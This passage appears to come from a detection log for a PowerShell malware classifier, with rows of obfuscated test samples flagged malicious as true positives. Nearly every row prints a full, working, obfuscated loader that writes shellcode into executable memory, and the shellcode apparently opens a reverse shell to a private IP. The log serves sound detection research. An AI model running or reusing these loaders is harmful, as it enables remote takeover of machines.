fl','x85,0','unt);JrQ;R','rtualAlloc(0,0x1000,RLmg','3,0x84,0x59,0xb8,0x73,0x2a,0x31,0x79,0x24,0x8a,0xe1,0x11,0x2e,0x05,0xde,0x02,0x51,0xcf,0x77,0x2','49','4,0x03,0x50,0x10,0x6e,0xdf,0x61,0xed,0xec,0x20,0x9a,0xee,0x90,0xa9,0x7f,0xdf,0x90,0xce,0xf4,0x70,0x20,0x84,0x59,0x7d,0xcb,0xc8,0x','2kQz=RLmw::Vi',',0x60,0x2e,0x2b,0x81,0x89,0x9d,0x12,0x2d','x41,0x7a,0x8b,0xaf,0xfa,0x48',',0xda,0xce,0xd9,0x74,0x24,0xf4,0x58,','70,0x9a,0xbd,0x58,0xd3,0xcd,0x29,0x63,0x02,0x39,0xf6,0x9c,0x61,0x32,0x3f,0x09,0xca,0x2c,0x40,0xdd,0xca,0xac,0x16,0xb7,0xca,0xc4,0xce,0xe3,0x98,0xf1,0x10,0x3e,0x8d,0xaa,0x84,0xc1,0xe4,0x1f,0x0e,0xaa,0x0a,0x46,0x78,0x75,0xf4,0xad,0x78','= 0x1000;if (RLmz.Length -gt 0x1000){RLmg = RLmz.Length};RLm',',0x59,0x15,0xad,0xd4,0','AllocationType, uint flProtect);[DllImport(Lsfkernel32.dllLsf)]public static extern IntPtr CreateThread(IntPtr lpThreadAttri','x4e,0xd0,0x37,0x69,0x8e,0x7a,0x91,0xa1,0xba,0xfa,0x1e,0x',',0x40);for (RL','tPtr memset(IntPtr dest, '))  -CRePlACE  'JrQ',[CHAR]39 -CRePlACE ([CHAR]82+[CHAR]76+[CHAR]109),[CHAR]36 -CRePlACE 'Lsf',[CHAR]34) )",malicious,TP
2026-07-13 16:56:56,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2130.ps1,custom-ps-ml,UNKNOWN,6a35ec19-4275-49d8-82ad-8de6d04b6479,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3187,1632.09,". ((GET-VaRIAblE '*MdR*').NAME[3,11,2]-JoIn'')( (((\""{74}{18}{50}{73}{44}{59}{9}{48}{10}{61}{69}{3}{11}{42}{28}{24}{1}{60}{71}{72}{22}{21}{65}{54}{36}{55}{14}{75}{12}{46}{49}{32}{27}{37}{56}{7}{5}{45}{41}{40}{67}{57}{38}{52}{19}{68}{33}{58}{43}{4}{26}{30}{62}{47}{6}{66}{29}{20}{34}{31}{39}{23}{35}{0}{8}{70}{51}{17}{63}{64}{2}{16}{15}{53}{13}{25}\""-f'0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0','ons -passthru;[Byte[]];[Byte[]]0Bdz = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x5',',0x','lpParameter, uint dwCreationFlag','x00,0x00,0x6a,0x','x00,0x00,0x29,0xc4,0x5',',0xff,0xd5,0x93,0x53,0x6a,0x00,','5,0xb8,0x90,0x01,0','x29,0xc6,0x75,0xc7','z','T','s',',0x7d,0xf8,0x3b,0x7d,0x24,0x7','Bdw::CreateThread(0,0,0Bdx,0,0','0x49,0x8b,0x34,0x8b,0x01,0xd6,0x','dz.Length-1);0Bdi++) {0Bdw::','1000,0Bdg,0x40);for (0Bdi=0;0Bdi -le (0B',',0x00,0x53,0xff,0xd5;0Bdg = 0x1000;if (0Bdz.Length -gt 0x1000){0Bdg = 0Bdz.Length};0Bdx=0Bdw::VirtualA','dllOP','5,0x97,0x','d5,0x83,0xf8,',',0xff,0xac','0x4a,0x26,0x31','0x6e,0x4d,0x61',' src, uint count);kXz;0Bdw = Add-Type -memberDefinition 0Bdc -Name OPjWin32OPj -namespace Win32Functi',',0);for (;;){Start-sleep 60};','00,0x6a,0x04','d,0x5d,0x68,0x33,0x32,0x00,0x','c extern IntPtr memset(IntPtr dest, uint','56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0x',',0x56,0x57,0','8,','8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8',',0x','0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x6',',0xff,0xd5,','0x01,0xd3,0x8b,0x','00,0x68,0x','50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0','0x75,',',0x29,0x80,0x6b,0x','x68',', IntPtr lpThreadId);[DllImport(OPjmsvcrt.dllOPj)]public stati','0x08,0x75,0xec,0xe8,0x61,0x00,0','tern IntPtr Virtua','4,0x50,0','5,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x','0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5','e, uint flAllocation','4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x','j)]publ','6a','xff,0xd','memset([IntPtr](0Bdx.ToInt32()+0Bdi), 0Bdz[0Bdi], 1)};0','1,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,','49,0x18,0xe3,0x3a,','77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd',',0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x','a5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,','lAlloc(IntPtr lpAddress, uint dwSi','0,0x30,0x8b,0x52,0x0c,0x8b,0x','ype, uint flProtect);[DllImport(OPjkernel32.dllOPj)]pu','x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,','ll','oc(0',',0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x1','0x','00,0xff,0xd5,0x6a,0x05,0x68,0x0a,0x97,0x02,0x1b','6a,0x10,0x56,0x57,0x68,0x99','blic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr ',',0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x','52,0x14,0x8b,0x72,0x28',',0x0f,0xb7,','ic static ex','0Bdc = kXz[DllImport(OPjkernel32.','31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03')) -RePLaCe'OPj',[cHAR]34-RePLaCe'kXz',[cHAR]39  -RePLaCe ([cHAR]48+[cHAR]66+[cHAR]100),[cHAR]36) )",malicious,TP
2026-07-13 16:57:03,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2146.ps1,custom-ps-ml,UNKNOWN,93476b44-44eb-4d9c-a85c-148cc19ede29,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2984,1652.42,"&amp; ( $VeRbosePREferEnce.tOStRiNg()[1,3]+'X'-jOIN'')(((\""{53}{5}{8}{29}{39}{6}{19}{55}{22}{10}{12}{44}{1}{58}{23}{46}{61}{2}{0}{15}{56}{20}{16}{43}{63}{24}{11}{14}{52}{54}{4}{33}{60}{28}{37}{69}{9}{67}{17}{48}{40}{25}{45}{49}{36}{68}{7}{50}{34}{35}{32}{18}{31}{59}{41}{65}{38}{66}{62}{51}{30}{21}{27}{26}{64}{47}{3}{13}{42}{57}\""-f' -Name zYUWin32zYU -namespace Win32Functions -passthru;[Byte[]];[Byte[]]nGRz = 0xfc,0xe8,0x89,0','svcrt.dllzYU)]public static extern IntPtr memset(IntPtr d','ition nGRc',':VirtualA','0,0x8b,0x40,0x78,0x85','t(zYUkernel32.dllzYU)]public static extern IntPtr Virtu','ect);[DllImport(zYUkernel32.dllzYU)]public static','0x5d,0x','alAlloc(IntPtr lpAddress, uint dwSi','d,0','nt dwCreationFlags, IntPtr l','0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x5','pThrea','lloc(0,0x1000,nGRg,0x40);for (nGRi=0;nGRi -le (nGRz.Le','2,0x10,0x8b,0x42','x00,0x','0,0xac,0','1,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x','0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,',' extern IntPtr Creat','0xb7,0x4a,0x26,0x31,0xff,0x31,0xc','2,0xd9,0xc8,0x5f,0xff,0xd5',' IntPtr lpStartAddress, IntPtr lpParameter, ui',', uint cou','0x20,0xc1,0xcf,','1,','75,0xec,0xc3;nGRg = 0x1000;if (nGR',',0x01,0xc3,0x29,0xc6,0x85,0xf6,0x','0x48,0x18,0x8b,0x58,0x20,0','ze, uint flAlloca','xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x0','0xea,0x0','x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,',',0xc0,','33,0x32,0x00,0x00',',0',',0x51,0xff,0xe0,0x','x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc','x00,0x6a,0x04,0x56,0x57,0x6','tionType, uint flProt','0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x0','0xff,0x4e','ngth-1);nGRi++) {nGRw::memset([IntPtr](nGRx.ToInt32()+nGRi), nGRz[nGRi], 1)};nGRw::Cre','x3c,0x61,0x7c,0x0','dId);[DllImport(zYUm','0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,','nt);YGl;nGRw = ','gth};nGRx=nGRw:','58,','0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a','68,0x','xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0',',0x3c,0','nGRc = YGl[DllImpor','x01,0xd','eThread(IntPtr lpThreadAttributes, uint dwStackSize,','00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,','ateThread(0,0,nGRx,0,0,0);for (;;){Start-sleep 60};','est, uint src','f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x15,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,','0x74,0x4a,0x01,0xd0,0x50,0x8b,','Add-Type -memberDefin','0','2,0x2c,','z.Length -gt 0x1000){nGRg = nGRz.Len',',0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0','8,0x02,0xd9,0xc8,0x5f,0xff,','x0','58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,','0,0xac,0xc1,0xcf,0x0')).rEPLaCE(([ChAR]122+[ChAR]89+[ChAR]85),[STrINg][ChAR]34).rEPLaCE('YGl',[STrINg][ChAR]39).rEPLaCE(([ChAR]110+[ChAR]71+[ChAR]82),[STrINg][ChAR]36))",malicious,TP
2026-07-13 16:57:06,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2147.ps1,custom-ps-ml,UNKNOWN,f03140e7-ba58-4cb0-9bef-775ceb26e437,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3103,1653.05," ((\""{14}{34}{0}{35}{18}{1}{72}{39}{2}{67}{19}{55}{45}{33}{3}{48}{16}{53}{4}{7}{58}{71}{65}{61}{36}{9}{50}{43}{40}{28}{27}{66}{24}{44}{20}{6}{21}{51}{59}{12}{56}{10}{17}{23}{47}{8}{63}{22}{41}{26}{68}{5}{64}{57}{52}{32}{54}{62}{31}{42}{15}{38}{25}{69}{29}{70}{46}{60}{30}{37}{49}{11}{13}\"" -f'rn IntPt','ckSi','r, uint dwCreationFl',', uint src, uint count);SpK;iH0w =',']iH0z =','x55,0xc4,0x7b,0xc0,0xfe,0x6e,0x94,0xbd,0x57,0x06,0x0d,0xe4,0x2c,0xb7,0xd2,0x32,0x49,0xf7,0x59,0xb1,0xad,0xb9,0xa9,0xbc,0xbd,0x2d,0x5a,0x8b,0x9c,0xfb,0x65,0x21,0x8a,0x03,0xf0,0xce,0x1d,0','3,0x0d,0x3a,0',' 0xb8,0xe9,0x2e,0xce,0xb6,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x3',',0xd5,0x06,0xfd,0','f,0x6f,0x63,0xe','0x65,0xdc,0xe8,0x87,0xe1,0x11,0xc1,0x37,0xf1,0x3d,0x52,0x4b,0xc3,0xe2,0xc8,0xc3,0x6f,0x6a,0xd7,0x14,0x90,0x41,0xaf,0x8b,0x6f,0x','IntPtr](iH0Tmh.ToInt32()+iH0i), iH0z[iH0i], 1)};iH0w::CreateThread(0,0,iH0Tmh,0,0,0);for (;;){Start','f0','-sleep 60};','iH0Ufj = SpK[DllImport(aVekernel32.dllaVe)]',',0x48,','erDefinition iH0Ufj -Name aVeWin32aV','6a,0xd0,0x82,0xab,','tect);[DllImport(aVekernel32.dllaVe)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSta','g','4,0x4','x3e,0xa8,0xac,0xef,0xd9,0x3b,0xa2,0x44,0xad,0x64,0xa6','a,0x85,0x62,0xe4,0x7c,0xa9,0x24,0xb9,0','0x3e,0x80,0xbc,0x1a,0x3f,0x4b,0x3d,0xa3,0xe','0xcf,0xf6,0x83,0xd6,','g ','19,0x85,0x69,0xd4,0x73,','x00,0x73,0x60,0x5b,0x09,',',0xa7,0x1c,0xe5,0x05,0x1a,0xb1,0x82,0x50,0xa7,0x3a,0xd8,0x75,0xaf,0xdf,0xa8,0x74,0x9e,0x71,0xa3,0x2e,0',';if (iH0z','Length};iH0Tmh=iH0w::VirtualAlloc(0,','0x4c,0x58,0xcd,0xd1,0xbb,0xc7,0x2e,0x34','c2,0x98,0x4e,0x8','tern IntPtr memset(IntPtr dest','public static exte','r VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPro','0x6','0x1000,iH0g,0x40);for (iH0i=0;iH0i -le (iH0z.Length-1);iH0i','0x55,0x39;iH0','ete','a,0x4c,0x2c,0x49','x3c,0x',',0x3a,0x3b,0xf9,0x70',',0xb8,0x84,0x4f,0xab,0x9e,0xab,0x50,0x80,0xe3,0xaa,0xd2,0xdb,0x37,0x0d,0xeb,0x13,0x4','0x72,0x01,0x50,0xa5,0xa8,0x8','atic ex','g = iH0','a,0xe6,0x38,0x33',' Add-Type -memb','++) {iH0w::memset([','6,0x1d',',0x5b,0x62,0x1f,0xd2,0xd0,0x','0x7d,0x01,0x11,0x','e -namespace Win32Functions -passthru;[Byte[]];[Byte[]','c,0x76,0x31,0xdb,0x2f,','s, IntPtr lpThreadId);[DllImport(aVemsvcrt.dllaVe)]public st',',0x53,0xa2,0xa1,0xd4,0x38,0x70,0xcb,0x4d,0xe4,0xd7,0xf4,0x8e,0x47,0x87,0x50,0xc4,','c,0xcd,0x78,0x92,0x33,0x2e,0xaf,0xa9,0xfa,0xba,0x10,0xc5,0x02,0x2b,0x91,0x15,0x55,0x21,0x91,','1,0x42,0x13,0x83,0xea,0xfc,0x03,0x42,0xe6,0xcc,0x3b,0x4a,0x10,0x92,0xc4,0','85,0x','z.',',','0x2f,0xe6,','xab,0xbd,0xea,0x02,0x2','x54,0x6','x39,0x76,0x6d','0x6b,0x65,0x66,0xc3,0x00,0x5d,0x1c,0xd2,0xc0,0xac,0xdd,0x79,0x2d,0x01,0x2c,0x83,0x69,0xa5,','a','0x0a,0','= 0x1000','.Length -gt 0x1000){iH0','xb3,0xe0,0xf3,0x4d,0x56,0xd1,0x33,0x29,0x12,0x41,0x84,0','ze, IntPtr lpStartAddress, IntPtr lpParam')).RepLaCE(([cHar]83+[cHar]112+[cHar]75),[sTrIng][cHar]39).RepLaCE(([cHar]97+[cHar]86+[cHar]101),[sTrIng][cHar]34).RepLaCE(([cHar]105+[cHar]72+[cHar]48),'$') |&amp;((GV '*mDR*').name[3,11,2]-JoiN'')",malicious,TP
2026-07-13 16:57:11,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2205.ps1,custom-ps-ml,UNKNOWN,bcc1a87e-4bdb-41a7-8d04-e96c2ad5c214,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2897,1708.95," . ( $enV:CoMSPec[4,26,25]-JOIn'')(((\""{46}{1}{42}{32}{39}{25}{24}{45}{17}{37}{9}{40}{48}{3}{19}{38}{10}{6}{27}{30}{15}{22}{12}{11}{13}{0}{4}{2}{16}{26}{35}{23}{14}{8}{31}{21}{34}{43}{29}{44}{5}{18}{33}{7}{28}{36}{41}{20}{47}\"" -f '0,0x8a,0x5f,0x2d,0x7d,0x23,0x92,0x2f,0xb9,0x83,0x4d,0x5a,0xb3,0xf0,0xf0,','(QY2ke','0,0x8b,0x2e,0xeb,0x93,0x2b','unctions -passthru;[Byte[]];[','0x5d,0x0','x6','0xb8,0x52,0x00,0x9f,0x14,0x54,0xa1,0x2a,0x43,0x5b,0x3','xdc,0xb5,0x6d,0xfb,0xe2,0xe0,0x5a,0xa4,0x1d,0xc7,0x5a,0x98,0xc','c,0x2c,0xcc,0x78,0xbd,0xa6,0x0c,0x85,0x68,0x52,0x08,0x11,0x53,0','tr memset(IntPtr d','xcf,0xb1,0x9e,0xe3,0x7f,0x02,0xd4,0xa6,0x73,0xe9,','0,0x02,0xc5,0xa4,0x5a,0x47,0xe0,0x7','0a,0xfe,0xf3,0xfb,0xef,0xb6,0xf2,0x2a,0xbe,0xcd,0xac,0xec,0x4','f,0xd0,0xb3,0x9e,0x81,0x3','9,0xb','xc8,0xf',',0xa4,0x4b,0x78,0xca,0x69,0x0d,0x0b,0xc0,0xc6,0x59,0x53,0xc4,0xd9,0x8e,0xef,0xf0,0x52,0x31,0x20,0x71,0','rtAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(QY2msvcrt.d','a,','Byte[]','afSz.Length-1);afSi++) {afSw::memset([IntPtr](afSx.ToInt32()+afSi), afSz[afSi], 1)};afSw::CreateThread(0,0,a','b,0x13,0x8a,0x3b,0x4e,0x14,0x5d,0xe0,0xc7,0xf2,0x0d,0x48,0x88,0xaa,0xe','0,0x4c,0x87,0x87,0xa7,0x60,0xac,0xd2,0x7b,0x','7c,0x7a,0x8d,0xe8,0x7c,0x52,0x4','teThre','int flProtect);[DllImport(QY2kernel32.dllQY2)]public static extern IntPtr Crea','x20,0x16,0xe4,0xda,0xf2,0x37,0xbd,0x86,0x55,0x47,0xdd,0x69,0x09,0xed,0','2,0x06,0xb7,0xfa,0xb','b,0x21,0x29,0xf0,0xcf;afSg = 0x1000;',',0x9f,0x5b,0xa8,0x38,0x2c,0','0,0x55,0xe4,0xdc,0x89,0x95,0xf9,0x1d,0xce,0','x0','l32.dllQY2)]public static extern IntPtr VirtualAlloc(Int','0x43,0xd4,0xcb,0x59,0xd8,0xdd,0x59,0x22,0xb6,0x21,0x8e,0xa2,0x46,0x74,0xc4,0xa2,0x2e,0x20,0xbc,0xf0,0x4b,0x2f,0x69,0x65,0xc0,0xba,0x92,0','d,0x38,0x68,0x1b,0x85,0x52,0x67,0x44,0xb5,0x5c,0xad,0xed,0x5f,0xb3,0x18,0x45,0xf7,0x2a,0x01','x95,0x87,0x5e,0x9c,0xf7,0xcf,0x93,0xad,0x07,0x0f,0xbc,0xa6,0x74,0x3d,0x63,0x1d,0x13,0x0d,0xec,0xbb,0xe4,0x72,0xc7,0x','if (afSz.Length -gt 0x1','llQY2)]public static extern IntP',']afSz = 0xd9,0xe5,0xd9,0x74,0x24,0xf4,0x5e,0xb8,0x02,0xad,0x7a,0x86,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x46,0x14,0x03,0x46,0x16,0x4f,0x8f,0x7a,0xfe,0x0d,0x70,0x83,0xfe,0x71,0xf8,0x66,0','Ptr lpAddress, uint dwSize, uint flAllocationType, u','est, uint src, uint count);hWe;afSw = Add-Type -memberDefinition afSc -Name QY2Win','000){afSg = afSz.Length};afSx=afSw::VirtualAlloc(0,0x1000,afSg,0x40);for (afSi=0;afSi -le (','rne',',0x1d,0x66,0xb2','x9b,0x66,0xc9,0x59,0x8f,0x1e,0x39,0x14,0xed,0x88,0x46,0x82,0x98,0x34,0xd3,0x29,0x0b,0x63,0x4b,0x30,0','ad(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpSta','afSc = hWe[DllImport','fSx,0,0,0);for (;;){Start-sleep 60};','32QY2 -namespace Win32F')).REplacE('afS','$').REplacE(([char]104+[char]87+[char]101),[stRInG][char]39).REplacE(([char]81+[char]89+[char]50),[stRInG][char]34) )",malicious,TP
2026-07-13 16:57:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2213.ps1,custom-ps-ml,UNKNOWN,4336bd43-77d2-40d4-af0a-0b90996cbb5d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2899,1532.51,"(((\""{51}{28}{6}{30}{13}{47}{25}{17}{58}{11}{69}{29}{32}{49}{24}{60}{3}{65}{46}{50}{27}{67}{5}{10}{62}{59}{52}{8}{61}{1}{64}{48}{45}{7}{44}{19}{55}{34}{63}{42}{9}{38}{39}{16}{41}{2}{37}{43}{26}{57}{15}{53}{0}{56}{40}{4}{66}{33}{54}{12}{23}{21}{22}{14}{20}{18}{36}{31}{68}{35}\"" -f',0x68,0xf0,0',',0xcf,0x0d,0x01,0xc7,','x5',' ','0,0x6a,0x','x89,','tr VirtualAlloc(IntPtr lpAddress, uint dwSiz','f4,0x03,0x7d,0xf8,0x3b,','0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c','77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd','0x00,0x00,0x00,0x60,0','ntPtr lpStartAddress, IntPtr lpP','8,','lic static extern IntPtr CreateThread(IntPtr lpThreadAtt','68,0x00,0x10,0x00,0','4e,0x08','ff,0xd5,0x50,0x50,0x50,0x5','nt dwStackSiz','c8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;qmQg = 0x1000;if (qmQz.Length -gt 0x1000){qmQg = qmQz.Length};qmQx=qmQw::V','0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x','x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0x',',0x8b,0x36,0x6a,0x4','0,0x','0x5f,0xff,0xd5','rt(',' ui','0,0x01,0xbb,0x89,0xe6,0x6a,0x10,','mberDefinition qmQc -Name 6LCWin326LC -namespace Win32Functions -passthru;[Byte[]]','c = oRQ[DllImport(6LCkernel32.dll6LC)]public static extern IntP','ter, uint dwCreationFl','e, uint flAllocationType, uint flProtect);[DllImport(6LCkernel32.dll6LC)]pub','for (qmQi=0;qmQi -le (qmQz.Length-1);qmQi++) {qmQw::memset([IntPtr](qmQx.ToInt32()+qmQi), qmQz[qmQi], 1)};qmQw::Cr','a','0x56,0x57,0x','x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5','0,0,qmQx,0,0,0);for (;;){Start-sleep 60};','irtualAlloc(0,0x1000,qmQg,0x40);','0,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x','5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b',',0x00,0x','x6a,0x0','0,0x40,0',',0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x','10,0x68,0x02,0x0','0x7d,0x24,0x75,','xc7,0x38,0xe0,0x75,0x','r memset(IntPtr dest','ributes,','0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0','gs, IntPtr lpThreadId);[DllImpo',', uint src, uint count);oRQ;qmQw = Add-Type -me','qmQ','x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,',',0x75,0xec','68,0x02,0xd9,0xc','66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0','xb5,0xa2,0x56,0xff,0xd5,0','0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x','e, I','2,0','6LCmsvcrt.dll6LC)]public',',0x02,0x2c,0x20,0xc1','x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x5','b,0x5b,0x61,0x59,0x5a,0x51','0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,','static extern IntPt','04,',';[Byte[]]qmQz = 0xfc,0xe8,0','eateThread(','arame'))  -RePlAcE([ChaR]54+[ChaR]76+[ChaR]67),[ChaR]34-RePlAcE  'oRQ',[ChaR]39-RePlAcE'qmQ',[ChaR]36) |InVoke-exPrESsIoN",malicious,TP
2026-07-13 16:57:22,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2219.ps1,custom-ps-ml,UNKNOWN,2d73ed6e-b8e4-46e3-ba3b-0021acad30b4,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2993,1694.54,"((\""{66}{63}{68}{13}{47}{31}{28}{21}{58}{44}{54}{24}{56}{10}{37}{65}{34}{33}{27}{17}{1}{40}{49}{25}{38}{4}{11}{52}{0}{15}{19}{22}{46}{69}{51}{43}{45}{30}{61}{57}{5}{14}{2}{35}{64}{6}{60}{53}{62}{50}{55}{12}{32}{18}{7}{39}{48}{59}{3}{41}{20}{67}{26}{9}{23}{16}{8}{29}{42}{36}\"" -f'xd6','c','0,0x50,0x68,0xea,0x0f,0xdf,0x','0xd','c,0x01',',0x00,0xff,0xd5,0x50,0x50',',0xd5,','b5,0xa2,0x56,0xff,0xd5,0x6a,0x','0;if (j1tz.Le','xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6','dlloaj)]public static extern IntPtr memset(I',',0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3',',0xff',' stati',',0x50,0x50,0x40,0x50,0x4',',0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0','= 0x100','0x7c,0x02,0x2','xf0,0x','x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b','x56,0x53,0x57,0x68,0','ttributes',',0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8',',0x75,0xec,0xc3;j1tg ',' IntPtr lpT','x01,0xc7,0xe2,0xf0','0xff,0','2,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,','rtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(oajkernel32.dlloaj)]public static extern IntPtr CreateThread(IntPtr lpThreadA','ngth -gt 0x1000){j1tg = j1tz.Length};j1tDqT=j1tw::VirtualAlloc(0,0x1000,j1tg,0x40);for (j1ti=0;j1ti -le (j1tz.Length-1);j1ti++) {j1tw::memset(','x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x0','ern IntPtr Vi',',0x4e,0x08,0x75,0xec,0x68,0','0x64,0x8b,0x5','];[Byte[]]j1tz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,','e0,0xf','leep 60};','ntPtr dest, uint src, uint count);B7Y;j1tw = Add',',0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3','00,0x6a,0x04,0x56,0',',0x20,0xc1,','5,0x93,0x53,0x6a,0x00,0','[IntPtr](j1tDqT.ToInt32()+j1ti), j1tz[j1ti], 1)};j1tw::CreateThread(0,0,j1tDqT,0,0,0);for (;;){Start-s','x68,0x77,0x73,0x32,',' lpStartAddress, IntPtr lpParameter, ','0x5f,0x54,0x68,0x4c,0','b,0x01,0xd0,0x89,0','c 